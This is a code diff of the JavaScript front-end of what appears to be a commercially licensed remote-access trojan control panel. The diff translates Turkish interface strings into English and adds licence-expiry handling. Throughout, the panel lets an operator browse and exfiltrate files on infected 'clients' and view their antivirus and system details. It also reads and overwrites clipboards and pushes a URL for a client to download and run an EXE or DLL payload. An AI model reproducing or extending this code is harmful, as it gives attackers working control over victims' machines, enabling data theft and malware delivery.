             const trail = fbCurrentPath.endsWith(fbSep) ? '' : fbSep;
             return fbCurrentPath + trail + name;
         }
@@ -2014,19 +2057,19 @@
             return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
         }
 
-        // ─── İndir ───────────────────────────────────────
+        // - Download -------------
         async function fbDownload(path, name) {
-            fbSetStatus('info', `↓ İndiriliyor: ${name}...`);
+            fbSetStatus('info', `↓ Downloading: ${name}...`);
             try {
                 const res = await apiFetch('/api/fb/download', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path })
                 });
-                if (!res.ok) { fbSetStatus('error', 'İndirme hatası: ' + res.status); return; }
+                if (!res.ok) { fbSetStatus('error', 'Download error: ' + res.status); return; }
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
-                // Base64 → Blob → tıklama
+                // Base64 → Blob → click
                 const bytes = atob(data.data);
                 const arr   = new Uint8Array(bytes.length);
                 for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
@@ -2036,11 +2079,11 @@
                 a.href = url; a.download = data.name || name;
                 document.body.appendChild(a); a.click();
                 setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 1000);
-                fbSetStatus('success', `✓ İndirildi: ${data.name} (${fbFmtSize(data.size)})`);
-            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+                fbSetStatus('success', `✓ Downloaded: ${data.name} (${fbFmtSize(data.size)})`);
+            } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // ─── Sil ─────────────────────────────────────────
+        // - Delete -------------──
         async function fbDelete(path) {
             try {
                 const res = await apiFetch('/api/fb/delete', {
@@ -2048,17 +2091,17 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path })
                 });
-                if (!res.ok) { fbSetStatus('error', 'Silme hatası: ' + res.status); return; }
+                if (!res.ok) { fbSetStatus('error', 'Delete error: ' + res.status); return; }
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
-                fbSetStatus('success', `✓ Silindi: ${path.split(/[/\\]/).pop()}`);
+                fbSetStatus('success', `✓ Deleted: ${path.split(/[/\\]/).pop()}`);
                 fbRefresh();
-            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+            } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // ─── Yeni Klasör ─────────────────────────────────
+        // - New Folder -----------
         async function fbMkdirPrompt() {
-            const name = prompt('Yeni klasör adı:');
+            const name = prompt('New folder name:');
             if (!name || !name.trim()) return;
             const full = fbBuildPath(name.trim());
             try {
@@ -2069,16 +2112,16 @@
                 });
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
-                fbSetStatus('success', `✓ Klasör oluşturuldu: ${name}`);
+                fbSetStatus('success', `✓ Folder created: ${name}`);
                 fbRefresh();
-            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+            } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // ─── Yükle ───────────────────────────────────────
+        // - Upload -------------
         async function fbUploadFiles(input) {
             const files = Array.from(input.files);
             if (!files.length) return;
-            fbSetStatus('info', `↑ ${files.length} dosya yükleniyor...`);
+            fbSetStatus('info', `↑ Uploading ${files.length} files...`);
             let ok = 0, fail = 0;
             for (const file of files) {
                 const targetPath = fbBuildPath(file.name);
@@ -2100,16 +2143,16 @@
             }
             input.value = '';
             fbSetStatus(fail ? 'error' : 'success',
-                `✓ ${ok} yüklendi${fail ? `, ✗ ${fail} başarısız` : ''}`);
+                `✓ ${ok} uploaded${fail ? `, ✗ ${fail} failed` : ''}`);
             fbRefresh();
         }
 
-        // ─── Yeniden Adlandır ────────────────────────────
+        // - Rename ---------─
         async function fbRename(oldPath, oldName) {
-            const newName = prompt('Yeni ad:', oldName);
+            const newName = prompt('New name:', oldName);
             if (!newName || !newName.trim() || newName.trim() === oldName) return;
             const trimmedName = newName.trim();
-            // Separator'ı (\ veya /) doğru bul
+            // find separator (\ or /) correctly
             const sepIdx  = Math.max(oldPath.lastIndexOf('\\'), oldPath.lastIndexOf('/'));
             const dir     = sepIdx >= 0 ? oldPath.substring(0, sepIdx + 1) : '';
             const newPath = dir + trimmedName;
@@ -2121,12 +2164,12 @@
                 });
                 const data = await res.json();
                 if (data.error) { fbSetStatus('error', data.error); return; }
-                fbSetStatus('success', `✓ Yeniden adlandırıldı: ${newName}`);
+                fbSetStatus('success', `✓ Renamed: ${newName}`);
                 fbRefresh();
-            } catch(e) { fbSetStatus('error', 'Bağlantı hatası'); }
+            } catch(e) { fbSetStatus('error', 'Connection error'); }
         }
 
-        // ─── Context Menu ────────────────────────────────
+        // - Context Menu ----------──
         function fbShowCtx(e, name, type, fullPath) {
             e.preventDefault();
             fbCtxTarget = { name, type, fullPath };
@@ -2168,7 +2211,7 @@
             fbHideCtx();
             if (!fbCtxTarget) return;
             const { name, fullPath } = fbCtxTarget;
-            if (!confirm(`"${name}" silinsin mi? Bu işlem geri alınamaz.`)) return;
+            if (!confirm(`Delete "${name}"? This action cannot be undone.`)) return;
             fbDelete(fullPath);
         }
 
@@ -2178,7 +2221,7 @@
             bar.className = 'fb-statusbar' + (type ? ' status-' + type : '');
         }
 
-        // ─── Keyboard ────────────────────────────────────
+        // - Keyboard ------------
         document.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
                 const active = document.activeElement;
@@ -2200,7 +2243,7 @@
             }
         });
 
-        // ─── Client Listesi Güncelle ─────────────────────
+        // - Update Client List -------
         async function refreshClients() {
             try {
                 const res = await apiFetch('/api/clients', { credentials: 'include' });
@@ -2212,10 +2255,10 @@
                 document.getElementById('nav-badge').textContent = count;
                 document.getElementById('stat-clients').textContent = count;
 
-                // Home mini liste
+                // Home mini list
                 const homeList = document.getElementById('home-client-list');
                 if (!clients || clients.length === 0) {
-                    homeList.innerHTML = '<div class="empty-mini">Henüz bağlı client yok.</div>';
+                    homeList.innerHTML = '<div class="empty-mini">No clients connected yet.</div>';
                 } else {
                     homeList.innerHTML = clients.slice(0, 5).map(c => `
                         <div class="home-client-row">
@@ -2227,10 +2270,10 @@
                     `).join('');
                 }
 
-                // Clients listesi
+                // Clients list
                 const list = document.getElementById('client-list');
                 if (!clients || clients.length === 0) {
-                    list.innerHTML = '<div class="empty">Henüz bağlı client yok.</div>';
+                    list.innerHTML = '<div class="empty">No clients connected yet.</div>';
                     if (selectedID) closeDetail();
                     return;
                 }
@@ -2281,7 +2324,7 @@
             }
         });
 
-        // ─── Terminal Resize ─────────────────────────────
+        // - Terminal Resize ---------──
         (function() {
             let isResizing = false;
             let startY = 0;
@@ -2317,7 +2360,7 @@
             document.addEventListener('mousemove', onMove);
             document.addEventListener('touchmove', onMove, { passive: false });
 
-            // Handle hazır olunca event ekle
+            // Attach event when handle is ready
             function attachHandle() {
                 const h = getHandle();
                 if (!h) return;
@@ -2325,7 +2368,7 @@
                 h.addEventListener('touchstart', onStart, { passive: false });
             }
 
-            // DOM hazır olana kadar bekle
+            // Wait until DOM is ready
             if (document.readyState === 'loading') {
                 document.addEventListener('DOMContentLoaded', attachHandle);
             } else {
@@ -2333,7 +2376,7 @@
             }
         })();
 
-        // ─── Remote File Execution ───────────────────────
+        // - Remote File Execution -------──
         let rfeType = 'exe';
 
         function rfeSetType(type) {
@@ -2342,7 +2385,7 @@
             document.getElementById('rfe-btn-dll').classList.toggle('active', type === 'dll');
             document.getElementById('rfe-args-row').style.display  = type === 'exe' ? 'flex' : 'none';
             document.getElementById('rfe-dll-note').style.display  = type === 'dll' ? 'flex' : 'none';
-            document.getElementById('rfe-card-title').textContent  = type === 'exe' ? 'Execute EXE' : 'Execute DLL';
+            document.getElementById('rfe-card-title').textContent  = type === 'exe' ? 'Execute ⚙' : 'Execute DLL';
             document.getElementById('rfe-url').placeholder = type === 'exe'
                 ? 'example.com/payload.exe'
                 : 'example.com/payload.dll';
@@ -2359,26 +2402,26 @@
 
         async function rfeExecute() {
             if (!selectedID) {
-                rfeShowResult(false, 'Önce bir client seçin.');
+                rfeShowResult(false, 'Select a client first.');
                 return;
             }
             const urlVal = document.getElementById('rfe-url').value.trim();
             const args   = document.getElementById('rfe-args').value.trim();
 
-            // URL'e http:// prefix'ini ekle (eğer yoksa)
+            // Add http:// prefix to URL if missing
             let url = urlVal;
             if (url && !/^https?:\/\//i.test(url)) url = 'http://' + url;
 
             if (!url) {
-                rfeShowResult(false, 'URL boş olamaz.');
+                rfeShowResult(false, 'URL cannot be empty.');
                 return;
             }
 
             const btn  = document.getElementById('rfe-run-btn');
             const text = document.getElementById('rfe-btn-text');
             btn.disabled = true;
-            text.textContent = '⏳ Bekleniyor...';
-            rfeSetStatus('loading', 'Komut gönderiliyor...');
+            text.textContent = '⏳ Waiting...';
+            rfeSetStatus('loading', 'Command being sent...');
             document.getElementById('rfe-result-card').style.display = 'none';
 
             try {
@@ -2388,19 +2431,19 @@
                     body: JSON.stringify({ id: selectedID, url, type: rfeType, args })
                 });
                 if (res.status === 504) {
-                    rfeShowResult(false, 'Timeout: client 30 saniye içinde cevap vermedi.');
+                    rfeShowResult(false, 'Timeout: client did not respond within 30 seconds.');
                 } else if (!res.ok) {
                     const txt = await res.text();
-                    rfeShowResult(false, 'Sunucu hatası: ' + txt);
+                    rfeShowResult(false, 'Server error: ' + txt);
                 } else {
                     const data = await res.json();
-                    rfeShowResult(data.success, data.message || (data.success ? 'Başarıyla çalıştırıldı.' : 'Çalıştırılamadı.'));
+                    rfeShowResult(data.success, data.message || (data.success ? 'Successfully executed.' : 'Could not be executed.'));
                 }
             } catch (e) {
-                rfeShowResult(false, 'Bağlantı hatası: ' + e.message);
+                rfeShowResult(false, 'Connection error: ' + e.message);
             } finally {
                 btn.disabled = false;
-                text.textContent = '▶ Çalıştır';
+                text.textContent = '▶ Run';
             }
         }
 
@@ -2413,17 +2456,17 @@
             body.className = 'rfe-result-body ' + (success ? 'rfe-ok' : 'rfe-err');
             icon.textContent = success ? '✓' : '✕';
             text.textContent = message;
-            rfeSetStatus(success ? 'ok' : 'err', success ? 'Başarılı' : 'Hata');
+            rfeSetStatus(success ? 'ok' : 'err', success ? 'Success' : 'Error');
         }
 
         function rfeClear() {
             document.getElementById('rfe-result-card').style.display = 'none';
             document.getElementById('rfe-url').value  = '';
             document.getElementById('rfe-args').value = '';
-            rfeSetStatus('', 'Hazır');
+            rfeSetStatus('', 'Ready');
         }
 
-        // ─── Clipboard Manager ───────────────────────────────
+        // - Clipboard Manager ----------─
         function cbSetStatus(type, msg) {
             const sb = document.getElementById('cb-statusbar');
             sb.textContent = msg;
@@ -2434,11 +2477,11 @@
         }
 
         async function clipboardRefresh() {
-            if (!selectedID) { cbSetStatus('err', 'Önce bir client seçin.'); return; }
+            if (!selectedID) { cbSetStatus('err', 'Select a client first.'); return; }
             const btn = document.getElementById('cb-refresh-btn');
             btn.disabled = true;
-            btn.textContent = '⏳ Okunuyor...';
-            cbSetStatus('loading', 'Clipboard okunuyor...');
+            btn.textContent = '⏳ Reading...';
+            cbSetStatus('loading', 'Reading clipboard...');
             document.getElementById('cb-read-area').value = '';
             try {
                 const res = await apiFetch('/api/clipboard/get', {
@@ -2447,31 +2490,31 @@
                     body: JSON.stringify({ id: selectedID })
                 });
                 if (res.status === 504) {
-                    cbSetStatus('err', 'Timeout: client cevap vermedi.');
+                    cbSetStatus('err', 'Timeout: client did not respond.');
                 } else if (!res.ok) {
-                    cbSetStatus('err', 'Sunucu hatası: ' + await res.text());
+                    cbSetStatus('err', 'Server error: ' + await res.text());
                 } else {
                     const data = await res.json();
-                    // \n escape'lerini geri çevir
+                    // unescape \n
                     const text = (data.text || '').replace(/\\n/g, '\n');
                     document.getElementById('cb-read-area').value = text;
-                    cbSetStatus('ok', 'Başarıyla okundu — ' + text.length + ' karakter');
+                    cbSetStatus('ok', 'Successfully read - ' + text.length + ' characters');
                 }
             } catch (e) {
-                cbSetStatus('err', 'Bağlantı hatası: ' + e.message);
+                cbSetStatus('err', 'Connection error: ' + e.message);
             } finally {
                 btn.disabled = false;
-                btn.textContent = '↻ Yenile';
+                btn.textContent = '↻ Refresh';
             }
         }
 
         async function clipboardWrite() {
-            if (!selectedID) { cbSetStatus('err', 'Önce bir client seçin.'); return; }
+            if (!selectedID) { cbSetStatus('err', 'Select a client first.'); return; }
             const text = document.getElementById('cb-write-area').value;
-            if (text === '') { cbSetStatus('err', 'Yazılacak metin boş olamaz.'); return; }
+            if (text === '') { cbSetStatus('err', 'Text to be written cannot be empty.'); return; }
             const btnText = document.getElementById('cb-write-btn-text');
-            btnText.textContent = '⏳ Yazılıyor...';
-            cbSetStatus('loading', 'Clipboard yazılıyor...');
+            btnText.textContent = '⏳ Writing...';
+            cbSetStatus('loading', 'Writing clipboard...');
             try {
                 const res = await apiFetch('/api/clipboard/set', {
                     method: 'POST', credentials: 'include',
@@ -2479,48 +2522,48 @@
                     body: JSON.stringify({ id: selectedID, text })
                 });
                 if (res.status === 504) {
-                    cbSetStatus('err', 'Timeout: client cevap vermedi.');
+                    cbSetStatus('err', 'Timeout: client did not respond.');
                 } else if (!res.ok) {
-                    cbSetStatus('err', 'Sunucu hatası: ' + await res.text());
+                    cbSetStatus('err', 'Server error: ' + await res.text());
                 } else {
                     const data = await res.json();
                     if (data.success) {
-                        cbSetStatus('ok', 'Clipboard başarıyla güncellendi.');
+                        cbSetStatus('ok', 'Clipboard successfully updated.');
                     } else {
-                        cbSetStatus('err', 'Hata: ' + data.message);
+                        cbSetStatus('err', 'Error: ' + data.message);
                     }
                 }
             } catch (e) {
-                cbSetStatus('err', 'Bağlantı hatası: ' + e.message);
+                cbSetStatus('err', 'Connection error: ' + e.message);
             } finally {
-                btnText.textContent = '✎ Yaz';
+                btnText.textContent = '✎ Write';
             }
         }
 
         function clipboardCopyLocal() {
             const text = document.getElementById('cb-read-area').value;
-            if (!text) { cbSetStatus('err', 'Kopyalanacak içerik yok.'); return; }
+            if (!text) { cbSetStatus('err', 'No content to copy.'); return; }
             navigator.clipboard.writeText(text)
-                .then(() => cbSetStatus('ok', 'Tarayıcı panosuna kopyalandı.'))
-                .catch(() => cbSetStatus('err', 'Tarayıcı panosu erişimi reddedildi.'));
+                .then(() => cbSetStatus('ok', 'Copied to browser clipboard.'))
+                .catch(() => cbSetStatus('err', 'Browser clipboard access denied.'));
         }
 
-        // ─── Client Settings ─────────────────────────────
+        // - Client Settings ---------──
         function loadClientSettings() {
             const d = selectedClientData;
-            document.getElementById('cs-desktop').textContent = d.desktop  || '—';
-            document.getElementById('cs-ip').textContent      = d.ip       || '—';
-            document.getElementById('cs-country').textContent = d.country  || '—';
-            document.getElementById('cs-av').textContent      = d.av       || '—';
-            document.getElementById('cs-id').textContent      = d.id       ? '#' + d.id : '—';
-            document.getElementById('cs-gpu').textContent     = d.gpu      || '—';
-            document.getElementById('cs-cpu').textContent     = d.cpu      || '—';
-            document.getElementById('cs-ram').textContent     = d.ram      || '—';
-            document.getElementById('cs-disk').textContent    = d.disk     || '—';
-            document.getElementById('cs-os').textContent      = d.winver   || '—';
-            document.getElementById('cs-osver').textContent   = d.winver   || '—';
-            document.getElementById('cs-process').textContent = d.process  || '—';
-            document.getElementById('cs-time').textContent    = d.connTime || '—';
+            document.getElementById('cs-desktop').textContent = d.desktop  || '-';
+            document.getElementById('cs-ip').textContent      = d.ip       || '-';
+            document.getElementById('cs-country').textContent = d.country  || '-';
+            document.getElementById('cs-av').textContent      = d.av       || '-';
+            document.getElementById('cs-id').textContent      = d.id       ? '#' + d.id : '-';
+            document.getElementById('cs-gpu').textContent     = d.gpu      || '-';
+            document.getElementById('cs-cpu').textContent     = d.cpu      || '-';
+            document.getElementById('cs-ram').textContent     = d.ram      || '-';
+            document.getElementById('cs-disk').textContent    = d.disk     || '-';
+            document.getElementById('cs-os').textContent      = d.winver   || '-';
+            document.getElementById('cs-osver').textContent   = d.winver   || '-';
+            document.getElementById('cs-process').textContent = d.process  || '-';
+            document.getElementById('cs-time').textContent    = d.connTime || '-';
             document.getElementById('cs-action-status').textContent = '';
             document.getElementById('cs-action-status').className = 'cs-action-status';
 
@@ -2534,7 +2577,7 @@
             const note = document.getElementById('cs-note-input').value.trim();
             const statusEl = document.getElementById('cs-action-status');
 
-            statusEl.textContent = '⏳ Kaydediliyor...';
+            statusEl.textContent = '⏳ Saving...';
             statusEl.className = 'cs-action-status cs-status-loading';
 
             try {
@@ -2546,18 +2589,18 @@
                 });
 
                 if (res.ok) {
-                    statusEl.textContent = '✓ Ayarlar kaydedildi.';
+                    statusEl.textContent = '✓ Settings saved.';
                     statusEl.className = 'cs-action-status cs-status-ok';
                     // Update current data so it doesn't revert on tab switch
                     selectedClientData.nickname = nickname;
                     selectedClientData.note = note;
                     refreshClients();
                 } else {
-                    statusEl.textContent = '✕ Hata: ' + await res.text();
+                    statusEl.textContent = '✕ Error: ' + await res.text();
                     statusEl.className = 'cs-action-status cs-status-err';
                 }
             } catch (e) {
-                statusEl.textContent = '✕ Bağlantı hatası.';
+                statusEl.textContent = '✕ Connection error.';
                 statusEl.className = 'cs-action-status cs-status-err';
             }
         }
@@ -2567,12 +2610,12 @@
             const delay = document.getElementById('cs-delay-input').value.trim();
             const statusEl = document.getElementById('cs-action-status');
             if (!delay || isNaN(delay) || delay < 1000) {
-                statusEl.textContent = '✕ Geçersiz süre (min 1000ms).';
+                statusEl.textContent = '✕ Invalid duration (min 1000ms).';
                 statusEl.className = 'cs-action-status cs-status-err';
                 return;
             }
 
-            statusEl.textContent = '⏳ Komut gönderiliyor...';
+            statusEl.textContent = '⏳ Command being sent...';
             statusEl.className = 'cs-action-status cs-status-loading';
 
             try {
@@ -2582,14 +2625,14 @@
                     body: JSON.stringify({ id: selectedID, cmd: '[set_delay]' + delay })
                 });
                 if (res.ok) {
-                    statusEl.textContent = '✓ Reconnect delay güncellendi.';
+                    statusEl.textContent = '✓ Reconnect delay updated.';
                     statusEl.className = 'cs-action-status cs-status-ok';
                 } else {
-                    statusEl.textContent = '✕ Hata: ' + res.status;
+                    statusEl.textContent = '✕ Error: ' + res.status;
                     statusEl.className = 'cs-action-status cs-status-err';
                 }
             } catch (e) {
-                statusEl.textContent = '✕ Bağlantı hatası.';
+                statusEl.textContent = '✕ Connection error.';
                 statusEl.className = 'cs-action-status cs-status-err';
             }
         }
@@ -2601,10 +2644,10 @@
             const label = labels[action] || action;
 
             if (action === 'uninstall') {
-                if (!confirm('Client kalıcı olarak kaldırılsın mı? Bu işlem geri alınamaz.')) return;
+                if (!confirm('Uninstall client permanently? This action cannot be undone.')) return;
             }
 
-            statusEl.textContent = '⏳ ' + label + ' komutu gönderiliyor...';
+            statusEl.textContent = '⏳ Sending ' + label + ' command...';
             statusEl.className = 'cs-action-status cs-status-loading';
 
             try {
@@ -2614,30 +2657,58 @@
                     body: JSON.stringify({ id: selectedID, cmd: '[' + action + ']' })
                 });
                 if (res.ok) {
-                    statusEl.textContent = '✓ ' + label + ' komutu gönderildi.';
+                    statusEl.textContent = '✓ ' + label + ' command sent.';
                     statusEl.className = 'cs-action-status cs-status-ok';
                 } else {
                     const txt = await res.text();
-                    statusEl.textContent = '✕ Hata: ' + txt;
+                    statusEl.textContent = '✕ Error: ' + txt;
                     statusEl.className = 'cs-action-status cs-status-err';
                 }
             } catch (e) {
-                statusEl.textContent = '✕ Bağlantı hatası.';
+                statusEl.textContent = '✕ Connection error.';
                 statusEl.className = 'cs-action-status cs-status-err';
             }
         }
 
-        // ─── Init ────────────────────────────────────────
+        function toggleLicense() {
+            const keyText = document.getElementById('license-key-text');
+            const btn = document.getElementById('toggle-license-btn');
+            if (keyText.classList.contains('blurred-key')) {
+                keyText.classList.remove('blurred-key');
+                btn.textContent = 'Hide';
+            } else {
+                keyText.classList.add('blurred-key');
+                btn.textContent = 'Show';
+            }
+        }
+
+        function updateRemainingTime() {
+            const expiryStr = "{{.LicenseExpiry}}";
+            if (!expiryStr || expiryStr === "") return;
+            const expiry = new Date(expiryStr);
+            const now = new Date();
+            const diff = expiry - now;
+            if (diff <= 0) {
+                document.getElementById('remaining-time').textContent = 'Expired';
+                return;
+            }
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
+            document.getElementById('remaining-time').textContent = `${days} days ${hours} hours`;
+        }
+
+        // - Init -------------─
+        updateRemainingTime();
         startStatsPolling();
         setInterval(refreshClients, 3000);
         refreshClients();
 
-        // ─── File Browser Event Delegation ───────────────
-        // (DOM hazır, script body sonunda çalışıyor)
+        // - File Browser Event Delegation -----
+        // (DOM ready, runs at the end of script body)
         ;(function() {
             const tbody = document.getElementById('fb-tbody');
 
-            // tbody: çift tık → aç/indir
+            // tbody: double click → open/download
             tbody.addEventListener('dblclick', e => {
                 const row = e.target.closest('tr.fb-row');
                 if (!row) return;
@@ -2647,7 +2718,7 @@
                     fbDownload(row.dataset.path, row.dataset.name);
             });
 
-            // tbody: act buton tıklama
+            // tbody: act button click
             tbody.addEventListener('click', e => {
                 const btn = e.target.closest('.fb-act-btn');
                 if (!btn) return;
@@ -2657,7 +2728,7 @@
                 else fbDownload(row.dataset.path, row.dataset.name);
             });
 
-            // tbody: sağ tık → context menu
+            // tbody: right click → context menu
             tbody.addEventListener('contextmenu', e => {
                 const row = e.target.closest('tr.fb-row');
                 if (!row) return;
@@ -2669,8 +2740,8 @@
                     fullPath: row.dataset.path,
                 };
                 const isDir = row.dataset.type === 'dir' || row.dataset.type === 'drive';
-                // Klasör → "Aç/Gir" göster, "İndir" gizle
-                // Dosya  → "Aç/Gir" gizle, "İndir" göster
+                // Folder → show "Open/Enter", hide "Download"
+                // File   → hide "Open/Enter", show "Download"
                 document.getElementById('fb-ctx-btn-open').style.display     = isDir ? '' : 'none';
                 document.getElementById('fb-ctx-btn-download').style.display = isDir ? 'none' : '';
                 const menu = document.getElementById('fb-ctx-menu');
@@ -2682,14 +2753,14 @@
                 menu.style.top  = y + 'px';
             });
 
-            // Breadcrumb: tıklama
+            // Breadcrumb: click
             document.getElementById('fb-breadcrumb').addEventListener('click', e => {
                 const item = e.target.closest('.fb-bc-nav');
                 if (!item) return;
                 fbNavigate(item.dataset.bcpath);
             });
 
-            // Herhangi bir yere tıkla → ctx menu kapat
+            // Click anywhere → close ctx menu
             document.addEventListener('click', () => fbHideCtx());
             document.addEventListener('contextmenu', e => {
                 if (!e.target.closest('tr.fb-row')) fbHideCtx();
